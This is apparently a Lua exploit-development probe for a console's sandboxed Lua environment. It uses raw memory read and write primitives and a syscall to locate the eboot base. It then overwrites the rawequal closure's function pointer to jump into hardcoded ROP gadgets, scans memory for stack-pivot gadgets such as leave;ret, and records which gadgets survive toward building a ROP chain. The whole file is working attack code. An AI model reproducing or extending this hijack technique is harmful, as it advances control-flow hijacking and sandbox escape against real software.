-- CRASH_CLASS: MODERATE
-- PROBE 123d: Gadget effect tests — ordered safe-first
--
-- 123a/123c showed pop rax;ret corrupts the Lua output stream because
-- eax = popped return addr (huge) → Lua dumps garbage as return values.
-- This probe tests gadgets in safe order:
--   1. xor eax,eax;ret (baseline — eax=0, clean)
--   2. bare ret (eax=residual, tells us pre-call eax)
--   3. pop rcx;ret (rcx clobber, eax=residual)
--   4. pop rdi;ret (rdi=L clobber, eax=residual)
--   5. pop rsi;ret (rsi clobber, eax=residual)
--   6. pop rdx;ret (rdx clobber, eax=residual)
--   7. leave;ret scan + pop rbp;ret test
--   8. pop rax;ret LAST (corrupts output)

print("=== PROBE 123d: GADGET EFFECTS (safe order) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo)), hi, lo
    end
    return nil, 0, 0
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function eboot_gadget_addr(ehi, elo, offset)
    local lo = elo + offset
    local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

collectgarbage("stop")

local eboot_base, eboot_hi, eboot_lo = get_eboot_base()
local rawequal_addr = parse_func_addr(rawequal)
local rawget_addr = parse_func_addr(rawget)

print("[*] eboot base: " .. fmt_addr(eboot_base))
print("[*] rawequal:   " .. fmt_addr(rawequal_addr))
print("[*] rawget:     " .. fmt_addr(rawget_addr))

if not eboot_base or not rawequal_addr then
    print("ABORT: missing addresses")
    return
end

local re_orig_lo = safe_rd(rawequal_addr + 0x20)
local re_orig_hi = safe_rd(rawequal_addr + 0x24)
print(string.format("[*] rawequal fn orig: 0x%08X_%08X", re_orig_hi or 0, re_orig_lo or 0))
print(string.format("[*] rawequal fn offset: eboot+0x%X", (re_orig_lo or 0) - eboot_lo))

local G = {
    xor_eax_ret  = 0x471,
    ret_only     = 0x42,
    pop_rax_ret  = 0x992,
    pop_rcx_ret  = 0xE64,
    pop_rsi_ret  = 0xD77D,
    pop_rdi_ret  = 0xC9DFE,
    pop_rdx_ret  = 0x3B02D7,
    mov_w_rdi_rax = 0x92C67,
    mov_rax_prax = 0x1EEBB,
}

local function redirect(gadget_off)
    local glo, ghi = eboot_gadget_addr(eboot_hi, eboot_lo, gadget_off)
    memory.write_dword(rawequal_addr + 0x20, glo)
    memory.write_dword(rawequal_addr + 0x24, ghi)
end

local function restore()
    memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
    memory.write_dword(rawequal_addr + 0x24, re_orig_hi)
end


-- =============================================
-- T1: xor eax,eax;ret baseline
-- =============================================
print("")
print("--- T1: xor eax,eax;ret (baseline) ---")
redirect(G.xor_eax_ret)
local ok1, r1 = pcall(rawequal, 1, 1)
restore()
print(string.format("[T1] ok=%s r1=%s%s", tostring(ok1), tostring(r1),
    (ok1 and r1 == nil) and " *** CONFIRMED ***" or " FAIL"))
if not (ok1 and r1 == nil) then print("ABORT") return end
print(string.format("[T1] restore: rawequal(1,1)=%s", tostring(rawequal(1,1))))


-- =============================================
-- T2: bare ret → eax residual
-- =============================================
print("")
print("--- T2: bare ret (eax residual) ---")
redirect(G.ret_only)
local ok2, r2a, r2b, r2c, r2d, r2e = pcall(rawequal, 1, 1)
restore()
print(string.format("[T2] ok=%s r1=%s r2=%s r3=%s r4=%s r5=%s",
    tostring(ok2), tostring(r2a), tostring(r2b), tostring(r2c),
    tostring(r2d), tostring(r2e)))
if ok2 then
    local nret = 0
    for _, v in ipairs({r2a, r2b, r2c, r2d, r2e}) do
        if v ~= nil then nret = nret + 1 else break end
    end
    print(string.format("[T2] nresults=%d → eax residual at call time = %d", nret, nret))
    if nret == 0 then
        print("[T2] *** eax=0 before our gadget! Dispatch zeroes eax. ***")
    elseif nret == 1 then
        print(string.format("[T2] eax=1, popped value type=%s val=%s", type(r2a), tostring(r2a)))
    elseif nret == 2 then
        print(string.format("[T2] eax=2, values: %s, %s", tostring(r2a), tostring(r2b)))
    end
end
print(string.format("[T2] restore: rawequal(1,1)=%s", tostring(rawequal(1,1))))


-- =============================================
-- T3: pop rcx;ret — rcx is caller-saved (volatile)
-- pop rcx consumes [rsp+0] (return addr), ret goes to [rsp+8]
-- eax is NOT touched → nresults = eax residual (same as T2)
-- =============================================
print("")
print("--- T3: pop rcx;ret ---")
redirect(G.pop_rcx_ret)
local ok3, r3a, r3b = pcall(rawequal, 1, 1)
restore()
print(string.format("[T3] ok=%s r1=%s r2=%s", tostring(ok3), tostring(r3a), tostring(r3b)))
if ok3 then
    print("[T3] *** pop rcx;ret SURVIVED → [rsp+8] is valid ***")
else
    print("[T3] CRASHED: " .. tostring(r3a))
end
print(string.format("[T3] restore: rawequal(1,1)=%s", tostring(rawequal(1,1))))


-- =============================================
-- T4: pop rdi;ret — clobbers lua_State* L
-- =============================================
print("")
print("--- T4: pop rdi;ret ---")
redirect(G.pop_rdi_ret)
local ok4, r4a, r4b = pcall(rawequal, 1, 1)
restore()
print(string.format("[T4] ok=%s r1=%s r2=%s", tostring(ok4), tostring(r4a), tostring(r4b)))
if ok4 then
    print("[T4] *** pop rdi;ret SURVIVED → dispatch ignores rdi after call ***")
else
    print("[T4] CRASHED: dispatch uses rdi after call")
end
print(string.format("[T4] restore: rawequal(1,1)=%s", tostring(rawequal(1,1))))


-- =============================================
-- T5: pop rsi;ret
-- =============================================
print("")
print("--- T5: pop rsi;ret ---")
redirect(G.pop_rsi_ret)
local ok5, r5a = pcall(rawequal, 1, 1)
restore()
print(string.format("[T5] ok=%s r1=%s", tostring(ok5), tostring(r5a)))
if ok5 then print("[T5] *** pop rsi;ret SURVIVED ***")
else print("[T5] CRASHED") end
print(string.format("[T5] restore: rawequal(1,1)=%s", tostring(rawequal(1,1))))


-- =============================================
-- T6: pop rdx;ret
-- =============================================
print("")
print("--- T6: pop rdx;ret ---")
redirect(G.pop_rdx_ret)
local ok6, r6a = pcall(rawequal, 1, 1)
restore()
print(string.format("[T6] ok=%s r1=%s", tostring(ok6), tostring(r6a)))
if ok6 then print("[T6] *** pop rdx;ret SURVIVED ***")
else print("[T6] CRASHED") end
print(string.format("[T6] restore: rawequal(1,1)=%s", tostring(rawequal(1,1))))


-- =============================================
-- T7: leave;ret scan + pop rbp;ret
-- =============================================
print("")
print("--- T7: Stack pivot gadget scan ---")

-- leave;ret = C9 C3
local leave_first = nil
local leave_count = 0
for off = 0, 0x500000 - 4, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
    local dw = safe_rd(addr)
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256
    if b0 == 0xC9 and b1 == 0xC3 then
        leave_count = leave_count + 1
        if leave_count <= 5 then
            print(string.format("  leave;ret at eboot+0x%X", off))
        end
        if not leave_first then leave_first = off end
    end
    if b1 == 0xC9 and b2 == 0xC3 then
        leave_count = leave_count + 1
        if leave_count <= 5 then
            print(string.format("  leave;ret at eboot+0x%X", off + 1))
        end
        if not leave_first then leave_first = off + 1 end
    end
    if b2 == 0xC9 and b3 == 0xC3 then
        leave_count = leave_count + 1
        if leave_count <= 5 then
            print(string.format("  leave;ret at eboot+0x%X", off + 2))
        end
        if not leave_first then leave_first = off + 2 end
    end
end
print(string.format("[T7] Total leave;ret: %d", leave_count))

-- pop rbp;ret = 5D C3
local pop_rbp_off = nil
for off = 0, 0x500000 - 4, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
    local dw = safe_rd(addr)
    if dw == nil then break end
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    if b0 == 0x5D and b1 == 0xC3 then pop_rbp_off = off; break end
    if b1 == 0x5D and b2 == 0xC3 then pop_rbp_off = off + 1; break end
end

if pop_rbp_off then
    print(string.format("[T7] pop rbp;ret at eboot+0x%X", pop_rbp_off))

    -- Test pop rbp;ret survival
    print("[T7b] Testing pop rbp;ret...")
    local prb_lo, prb_hi = eboot_gadget_addr(eboot_hi, eboot_lo, pop_rbp_off)
    memory.write_dword(rawequal_addr + 0x20, prb_lo)
    memory.write_dword(rawequal_addr + 0x24, prb_hi)
    local ok7, r7a = pcall(rawequal, 1, 1)
    restore()
    print(string.format("[T7b] ok=%s r1=%s", tostring(ok7), tostring(r7a)))

    if ok7 then
        print("[T7b] *** pop rbp;ret SURVIVED ***")
        local check7 = rawequal(1, 1)
        print(string.format("[T7b] rawequal after rbp clobber: %s", tostring(check7)))
        if check7 == true then
            print("[T7b] *** rbp IS callee-saved but dispatch does NOT depend on it ***")
            print("[T7b] *** STACK PIVOT CHAIN IS POSSIBLE ***")
        else
            print("[T7b] dispatch depends on rbp — pivot needs more work")
        end
    else
        print("[T7b] pop rbp;ret CRASHED")
    end
else
    print("[T7] pop rbp;ret NOT FOUND")
end


-- =============================================
-- T8: CClosure struct dumps
-- =============================================
print("")
print("--- T8: CClosure struct dumps ---")
print("[T8] rawequal CClosure:")
for off = 0, 0x3F, 8 do
    local val = safe_rq(rawequal_addr + off)
    print(string.format("  +0x%02X: %s", off, fmt_addr(val)))
end
print("[T8] rawget CClosure:")
for off = 0, 0x3F, 8 do
    local val = safe_rq(rawget_addr + off)
    print(string.format("  +0x%02X: %s", off, fmt_addr(val)))
end


-- =============================================
-- T9: pop rax;ret LAST (will corrupt output stream)
-- Everything above must be printed before this.
-- =============================================
print("")
print("--- T9: pop rax;ret (LAST — corrupts output) ---")
print("[T9] MARKER_FINAL_BEFORE_POP_RAX")
redirect(G.pop_rax_ret)
local ok9 = pcall(rawequal, 1, 1)
restore()
-- Output may be garbled from here
print("")
print(string.format("[T9] pcall_ok=%s", tostring(ok9)))
print("[T9] MARKER_FINAL_AFTER")


print("")
print("=== PROBE 123d COMPLETE ===")
